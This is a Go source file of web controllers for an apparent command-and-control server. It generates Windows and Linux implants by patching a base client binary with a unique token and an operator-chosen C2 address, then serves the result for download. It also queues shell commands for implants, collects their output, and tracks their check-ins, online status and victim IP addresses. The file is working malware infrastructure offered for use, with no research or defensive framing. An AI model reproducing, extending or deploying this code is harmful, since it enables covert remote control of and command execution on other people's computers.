package controllers

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"awesomeProject/config"
	"awesomeProject/database"
	"awesomeProject/models"

	"github.com/gin-gonic/gin"
)

const (
	tokenPlaceholder = "deadbeef-0000-0000-0000-000000000000"
	c2Placeholder    = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX" // 64 bytes

	baseClientWindowsRel = "binaries/base_client_windows.exe"
	baseClientLinuxRel   = "binaries/base_client_linux"
	baseClientRel        = "binaries/base_client"
)

var (
	baseClientWindowsPath string
	baseClientLinuxPath   string
	baseClientPathOld     string
)

func init() {
	wd, _ := os.Getwd()
	baseClientWindowsPath = filepath.Join(wd, baseClientWindowsRel)
	if _, err := os.Stat(baseClientWindowsPath); os.IsNotExist(err) {
		panic(fmt.Sprintf("CRITICAL ERROR: Windows base binary not found at: '%s'", baseClientWindowsPath))
	}
	baseClientLinuxPath = filepath.Join(wd, baseClientLinuxRel)
	if _, err := os.Stat(baseClientLinuxPath); os.IsNotExist(err) {
		panic(fmt.Sprintf("CRITICAL ERROR: Linux base binary not found at: '%s'", baseClientLinuxPath))
	}
	baseClientPathOld = filepath.Join(wd, baseClientRel)
	// Optional: Log successful loading
	fmt.Printf("CONTROLLER.init: Windows base binary: %s\n", baseClientWindowsPath)
	fmt.Printf("CONTROLLER.init: Linux base binary: %s\n", baseClientLinuxPath)
}

// GenerateImplant - (No changes needed here, it already takes target_os)
func GenerateImplant(c *gin.Context) {
	userIfc, _ := c.Get("user_id")
	userID := userIfc.(int)

	var req struct {
		TargetOS string `json:"target_os" binding:"required,oneof=windows linux"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request: 'target_os' (windows/linux) is required. " + err.Error()})
		return
	}

	imp, err := database.CreateImplant(userID, req.TargetOS)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate implant record"})
		return
	}
	c.JSON(http.StatusCreated, gin.H{"message": "Implant record generated for " + req.TargetOS, "implant": imp})
}

// DownloadConfiguredImplant - MODIFIED
// POST /api/implants/:implant_id/download-configured
func DownloadConfiguredImplant(c *gin.Context) {
	implantDBUniqueToken := c.Param("implant_id")
	userID := c.MustGet("user_id").(int)

	// MODIFIED: Request body now only expects C2_IP
	var req struct {
		C2IP string `json:"c2_ip" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload: 'c2_ip' is required. " + err.Error()})
		return
	}

	// 1. Verify user ownership AND fetch the implant to get its TargetOS
	implant, err := database.GetImplantByToken(userID, implantDBUniqueToken)
	if err != nil {
		fmt.Printf("CONTROLLER.DownloadConfiguredImplant: ERROR - Implant [%s] not found or unauthorized for user %d. Error: %v\n", implantDBUniqueToken, userID, err)
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}
	// We now have implant.TargetOS

	// 2. Select binary path and output filename based on implant.TargetOS (from DB)
	var selectedBinaryPath string
	var outputFilename string

	if implant.TargetOS == "windows" {
		selectedBinaryPath = baseClientWindowsPath
		outputFilename = fmt.Sprintf("implant_%s_windows.exe", implantDBUniqueToken)
	} else if implant.TargetOS == "linux" {
		selectedBinaryPath = baseClientLinuxPath
		outputFilename = fmt.Sprintf("implant_%s_linux", implantDBUniqueToken)
	} else {
		// This case should ideally not happen if TargetOS is always set during generation
		fmt.Printf("CONTROLLER.DownloadConfiguredImplant: ERROR - Implant [%s] has an unknown or unset TargetOS: [%s]\n", implantDBUniqueToken, implant.TargetOS)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Implant has an invalid target OS configured in the database."})
		return
	}

	// 3. Read the base binary
	baseBinaryData, err := os.ReadFile(selectedBinaryPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read base client binary: " + err.Error()})
		return
	}

	patchedData := make([]byte, len(baseBinaryData))
	copy(patchedData, baseBinaryData)

	// 4. Patch Unique Token (implantDBUniqueToken)
	tokenIdx := bytes.LastIndex(patchedData, []byte(tokenPlaceholder))
	if tokenIdx == -1 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Token placeholder not found in base client binary."})
		return
	}
	if len(implantDBUniqueToken) != len(tokenPlaceholder) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: Implant ID length mismatch for patching."})
		return
	}
	copy(patchedData[tokenIdx:], []byte(implantDBUniqueToken))

	// 5. Patch C2 IP (using req.C2IP from request body)
	c2Idx := bytes.LastIndex(patchedData, []byte(c2Placeholder))
	if c2Idx == -1 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "C2 IP placeholder not found in base client binary."})
		return
	}
	c2IPBytes := []byte(req.C2IP)
	if len(c2IPBytes) > len(c2Placeholder) {
		errorMsg := fmt.Sprintf("C2 IP is too long. Max length: %d, Got: %d", len(c2Placeholder), len(c2IPBytes))
		c.JSON(http.StatusBadRequest, gin.H{"error": errorMsg})
		return
	}
	paddedC2IP := make([]byte, len(c2Placeholder))
	copy(paddedC2IP, c2IPBytes)
	copy(patchedData[c2Idx:], paddedC2IP)

	// 6. Serve patched data
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outputFilename))
	c.Header("Content-Type", "application/octet-stream")
	c.Data(http.StatusOK, "application/octet-stream", patchedData)
	fmt.Printf("CONTROLLER.DownloadConfiguredImplant: Served patched binary [%s] for implant [%s] (OS: %s) with C2 IP: %s\n", outputFilename, implantDBUniqueToken, implant.TargetOS, req.C2IP)
}

// --- Other controller functions (GetUserImplants, SendCommand, etc.) remain the same ---
// GetUserImplants remains the same
func GetUserImplants(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	implants, err := database.GetImplantsByUserID(userID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch implants"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"implants": implants})
}

// SendCommand remains the same
func SendCommand(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	var req struct {
		ImplantID string `json:"implant_id"`
		Command   string `json:"command"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}
	imp, err := database.GetImplantByID(req.ImplantID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}
	if imp.UserID != userID {
		c.JSON(http.StatusForbidden, gin.H{"error": "You do not own this implant"})
		return
	}
	cmd := models.Command{
		ImplantID: req.ImplantID,
		Command:   req.Command,
		Status:    "pending",
	}
	if err := config.DB.Create(&cmd).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create command"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Command sent successfully", "command_id": cmd.ID})
}

// ImplantClientFetchCommands remains the same
func ImplantClientFetchCommands(c *gin.Context) {
	implantUniqueToken := c.Param("unique_token")
	if implantUniqueToken == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant unique token is required"})
		return
	}
	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", implantUniqueToken).First(&imp).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}
	imp.LastSeen = time.Now()
	imp.Status = "online"
	if err := config.DB.Save(&imp).Error; err != nil {
		// Log error
	}
	cmds, err := database.GetPendingCommandsForImplant(implantUniqueToken)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch pending commands"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"commands": cmds})
}

// DashboardGetCommandsForImplant remains the same
func DashboardGetCommandsForImplant(c *gin.Context) {
	userID := c.MustGet("user_id").(int)
	implantUniqueToken := c.Param("implant_id")
	if implantUniqueToken == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Implant ID is required"})
		return
	}
	var implant models.Implant
	if err := config.DB.Where("unique_token = ? AND user_id = ?", implantUniqueToken, userID).First(&implant).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}
	cmds, err := database.GetCommandsByImplantID(implantUniqueToken)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch commands"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"commands": cmds})
}

// HandleCommandResult remains the same
func HandleCommandResult(c *gin.Context) {
	var req struct {
		CommandID int    `json:"command_id"`
		Output    string `json:"output"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}
	var cmd models.Command
	if err := config.DB.First(&cmd, req.CommandID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Command not found"})
		return
	}
	if cmd.Status == "executed" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Command already executed"})
		return
	}
	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", cmd.ImplantID).First(&imp).Error; err == nil {
		imp.LastSeen = time.Now()
		imp.Status = "online"
		config.DB.Save(&imp)
	}
	if err := database.MarkCommandAsExecuted(req.CommandID, req.Output); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update command status"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Command result received"})
}

// CheckinImplant remains the same
func CheckinImplant(c *gin.Context) {
	var req struct {
		UniqueToken string `json:"implant_id"`
		IPAddress   string `json:"ip_address"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
		return
	}
	var imp models.Implant
	if err := config.DB.Where("unique_token = ?", req.UniqueToken).First(&imp).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
		return
	}
	imp.Status = "online"
	imp.Deployed = true
	if req.IPAddress != "" {
		imp.IPAddress = req.IPAddress
	} else {
		imp.IPAddress = c.ClientIP()
	}
	imp.LastSeen = time.Now()
	if err := config.DB.Save(&imp).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update implant on check-in"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Check-in successful"})
}

// DeleteImplant remains the same
func DeleteImplant(c *gin.Context) {
	token := c.Param("implant_id")
	userID := c.MustGet("user_id").(int)
	var imp models.Implant
	if err := config.DB.Where("unique_token = ? AND user_id = ?", token, userID).First(&imp).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}
	if err := config.DB.Where("implant_id = ?", imp.UniqueToken).Delete(&models.Command{}).Error; err != nil {
		// Log warning
	}
	if err := config.DB.Delete(&imp).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to delete implant"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "Implant deleted successfully"})
}

// DownloadImplant (GET) remains as is, or could be deprecated if not needed.
func DownloadImplant(c *gin.Context) {
	implantDBUniqueToken := c.Param("implant_id")
	userID := c.MustGet("user_id").(int)

	fmt.Printf("CONTROLLER.DownloadImplant (GET): Received request for implant ID: [%s]\n", implantDBUniqueToken)

	_, err := database.GetImplantByToken(userID, implantDBUniqueToken)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found or unauthorized"})
		return
	}

	baseBinaryData, err := os.ReadFile(baseClientPathOld)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read base client binary: " + err.Error()})
		return
	}

	patchedData := make([]byte, len(baseBinaryData))
	copy(patchedData, baseBinaryData)

	idx := bytes.LastIndex(patchedData, []byte(tokenPlaceholder))
	if idx == -1 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Placeholder not found in base client binary."})
		return
	}
	if len(implantDBUniqueToken) != len(tokenPlaceholder) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Critical error: ID length mismatch."})
		return
	}
	copy(patchedData[idx:], []byte(implantDBUniqueToken))

	outName := fmt.Sprintf("implant_legacy_%s", implantDBUniqueToken)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outName))
	c.Header("Content-Type", "application/octet-stream")
	c.Data(http.StatusOK, "application/octet-stream", patchedData)
	fmt.Printf("CONTROLLER.DownloadImplant (GET): Served legacy binary [%s].\n", outName)
}
